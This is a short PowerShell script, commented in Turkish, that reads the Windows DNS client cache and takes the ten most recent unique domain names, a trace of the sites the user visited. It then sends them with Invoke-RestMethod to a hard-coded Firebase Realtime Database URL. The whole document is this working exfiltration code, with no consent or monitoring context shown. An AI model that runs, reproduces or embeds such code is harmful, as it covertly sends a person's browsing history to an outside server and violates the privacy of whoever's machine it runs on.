# Config
$firebaseUrl = "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/history.json"

# DNS Cache çek
$dnsEntries = (Get-DnsClientCache).Name | Sort-Object -Unique | Select-Object -Last 10

# JSON formatla
$data = @{ visited = $dnsEntries } | ConvertTo-Json -Depth 2

# Firebase'e gönder
Invoke-RestMethod -Uri $firebaseUrl -Method PUT -Body $data
